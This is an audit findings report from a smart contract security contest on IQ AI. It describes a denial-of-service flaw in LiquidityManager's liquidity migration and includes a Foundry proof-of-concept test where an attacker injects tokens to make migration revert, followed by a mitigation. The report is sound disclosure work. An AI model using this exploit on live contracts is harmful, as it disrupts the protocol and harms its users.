# IQ AI: Tokenized AI agents - Findings Report

## Table of contents
- ### Medium Risk Findings
    - #### M-01. Attacker can DOS liquidity migration in LiquidityManager.sol

# <a id='contest-summary'></a>Contest Summary

[See more contest details here](https://code4rena.com/audits/2025-01-iq-ai)

# <a id='results-summary'></a>Results Summary

### Number of findings:
- High: 0
- Medium: 1

# Meidum Risk Findings

## <a id='M-01'></a>M-01. Attacker can DOS liquidity migration in LiquidityManager.sol
# Finding Description and Impact

The `LiquidityManager`’s liquidity migration function, `moveLiquidity()` is susceptible to a **DOS attack** that any malicious attacker can perform.

The reason for this is that `moveLiquidity()` relies on the raw ERC20 balance of the currency token held by the contract to determine the amount of agent token liquidity to add. In particular, the function calculates the currency token balance via:

```solidity
uint256 currencyAmount = currencyToken.balanceOf(address(this));
uint256 liquidityAmount = (currencyAmount * 1e18) / price;
```

This design assumes that the only currency tokens held by the `LiquidityManager` are those coming from the controlled bootstrap pool. However, an attacker can directly transfer extra currency tokens (e.g., IQ tokens) into the `LiquidityManager`.

This “injection” increases the raw balance reported by `balanceOf(address(this))`, causing the computed `liquidityAmount` — which represents the amount of agent tokens required for migration — to be artificially inflated.

When the `LiquidityManager` then attempts to transfer agent tokens to add liquidity (via a subsequent call to `addLiquidityToFraxswap()`), the computed amount exceeds the actual agent token balance held by the contract. This results in a failure (an `ERC20InsufficientBalance` revert) during the migration process, effectively causing a **denial-of-service (DoS)** that blocks liquidity migration and disrupts normal protocol operations.

---

## Impact

- **Protocol Disruption:** The migration process is a core functionality for moving liquidity from the bootstrap pool to the Fraxswap pair.  
- **User Harm:** Disrupted liquidity migration can result in poor market pricing or loss of confidence, potentially causing users to incur losses when trading or exiting positions.  
- **Denial-of-Service (DoS):** An attacker can exploit this vulnerability to prevent liquidity migration, indirectly impacting the protocol’s ability to function as intended.  

**Impact:** High  
**Likelihood:** Medium (as it requires an attacker to spend funds). How well-funded he must be depends on the exact amount of tokens that will be used in a real environment and how willing he is to cause damage to the protocol and its users (a competitor or someone else with malicious intent).

---

# Proof of Concept

Let's look at the relevant parts of the source code. A coded POC is supplied after.  

### `LiquidityManager.sol`, `moveLiquidity()`:

```solidity
// Determine liquidity amount to add
uint256 currencyAmount = currencyToken.balanceOf(address(this));
uint256 liquidityAmount = (currencyAmount * 1e18) / price;

// Add liquidity to Fraxswap
IFraxswapPair fraxswapPair = addLiquidityToFraxswap(liquidityAmount, currencyAmount);
```

We can see that the function relies on the raw currency tokens balance of the contract and uses that to calculate `liquidityAmount` — the amount of agent tokens to add as liquidity to Fraxswap.

### `addLiquidityToFraxswap()`:

```solidity
function addLiquidityToFraxswap(
    uint256 liquidityAmount,
    uint256 currencyAmount
) internal returns (IFraxswapPair fraxswapPair) {
    fraxswapPair = IFraxswapPair(fraxswapFactory.getPair(address(currencyToken), address(agentToken)));
    if (fraxswapPair == IFraxswapPair(address(0))) {
        // Create Fraxswap pair and add liquidity
        fraxswapPair = IFraxswapPair(fraxswapFactory.createPair(address(currencyToken), address(agentToken), fee));

        agentToken.safeTransfer(address(fraxswapPair), liquidityAmount); // <--

        currencyToken.safeTransfer(address(fraxswapPair), currencyAmount);
        fraxswapPair.mint(address(this));
}
```

Now, if the `liquidityAmount` has been inflated by performing the attack, this line will fail if the contract doesn't have enough balance:

```solidity
agentToken.safeTransfer(address(fraxswapPair), liquidityAmount);
```

---

To demonstrate this vulnerability, here's a coded POC that you can add to `MoveLiquidityTest.sol`.  
Run it via:

```bash
forge test --match-test test_MoveLiquidity_TokenInjection -vvv
```

```solidity
function test_MoveLiquidity_TokenInjection() public {
    // Set up the fork and environment.
    setUpFraxtal(12_918_968);

    // agent deployer
    address dev = address(0x1234);
    // attacker
    address attacker = 0x00160baF84b3D2014837cc12e838ea399f8b8478;

    // deal to dev a lot of currency tokens to operate
    deal(address(currencyToken), dev, 30_000_000e18);
    
    // Set target liquidity parameters in the factory.
    uint256 targetCCYLiquidity = 6_100_000e18;
    
    // Deploy a new AgentFactory. (Assume currencyToken is already set up.)
    factory = new AgentFactory(currencyToken, 0);
    factory.setAgentBytecode(type(Agent).creationCode);
    factory.setGovenerBytecode(type(TokenGovernor).creationCode);
    factory.setLiquidityManagerBytecode(type(LiquidityManager).creationCode);

    // For testing migration quickly, set a low target liquidity.
    factory.setTargetCCYLiquidity(1000);
    // Set an initial price, e.g. 0.1 IQ per agent token.
    factory.setInitialPrice(0.1e18);

    // --- Deploy agent and all relevant contract ---
    
    // Simulate normal user activity to push the pool toward the target.
    vm.startPrank(dev);

    // Approve and create the agent
    currencyToken.approve(address(factory), type(uint256).max);

    // dev directly buys enough so that the target liquidity is satisfied
    agent = factory.createAgent("ExploitAgent", "EXP", "https://exploit.com", targetCCYLiquidity);
    token = agent.token();
    
    // Retrieve the LiquidityManager and the BootstrapPool.
    manager = LiquidityManager(factory.agentManager(address(agent)));
    bootstrapPool = manager.bootstrapPool();
    
    // ensure bootstrap pool is initialized
    require(address(bootstrapPool) != address(0), "BootstrapPool not initialized");
    
    vm.stopPrank();

    // --- Attacker Manipulates the LiquidityManager by Injecting Currency Tokens ---
    // Here the attacker directly transfers extra currency tokens into the LiquidityManager.

    // deal currency tokens to the attacker
    deal(address(currencyToken), attacker, 10_000_000e18);
    
    // Impersonate the attacker.
    vm.startPrank(attacker);
    uint256 extraIQTokens = currencyToken.balanceOf(attacker); // Amount chosen for demonstration.

    // transfer the currency tokens to the manager contract
    currencyToken.transfer(address(manager), extraIQTokens);
    
    // --- Migrate Liquidity ---
    manager.moveLiquidity();
    
    // After migration, retrieve the Fraxswap pair created by the LiquidityManager.
    IFraxswapPair fraxswapPair = IFraxswapPair(
        manager.fraxswapFactory().getPair(address(currencyToken), address(token))
    );
    (uint112 fraxIQ, uint112 fraxAgent, ) = fraxswapPair.getReserves();
    console2.log("Fraxswap Pool IQ Reserve:", fraxIQ);
    console2.log("Fraxswap Pool Agent Token Reserve:", fraxAgent);
    
    // Compute the final price in Fraxswap.
    uint256 finalPrice = (uint256(fraxIQ) * 1e18) / uint256(fraxAgent);
    console2.log("Final Price in Fraxswap (IQ per agent token):", finalPrice);
    
    vm.stopPrank();
}
```

With that implementation, the test fails because the manager contract doesn't have enough agent token balance:

```
[FAIL. Reason: ERC20InsufficientBalance(0x20518cf72FF021e972F704d5B56Ab73FC163713d, 62348026684955421160920257 [6.234e25], 62348026684955421403284271 [6.234e25])] test_MoveLiquidity_TokenInjection() (gas: 48955838)
```

To verify that this test works otherwise, change this line:

```solidity
deal(address(currencyToken), attacker, 10_000_000e18);
```

to

```solidity
deal(address(currencyToken), attacker, 9_000_000e18);
```

By decreasing the amount of currency tokens the attacker adds, the test and the migration will be successful.

---

## Summary

In our testing environment, when the attacker transfers **9,000,000 IQ tokens** to the `LiquidityManager`, the migration process succeeds (albeit with an artificially manipulated price). However, when the attacker increases the injection to **10,000,000 IQ tokens**, the computed liquidity amount exceeds the actual agent token balance held by the `LiquidityManager`. This results in an `ERC20InsufficientBalance` error during the liquidity migration step, effectively causing the process to revert.

**(Note:** The detailed logs and the failing transaction trace confirm that the agent token transfer reverts because the required amount is slightly higher than available.)

---

# Recommended Mitigation Steps

Calculate the liquidity amount based on the currency amount that was received by the bootstrap pool. Proposed fix:

```solidity
uint256 currencyAmount = _reserveCurrencyToken;
```

That way the attack wouldn't work, and there's also no risk of tokens getting left in the manager contract as you transfer them to the agent either way:

```solidity
agentToken.safeTransfer(address(agent), agentToken.balanceOf(address(this)));
currencyToken.safeTransfer(address(agent), currencyToken.balanceOf(address(this)));
```
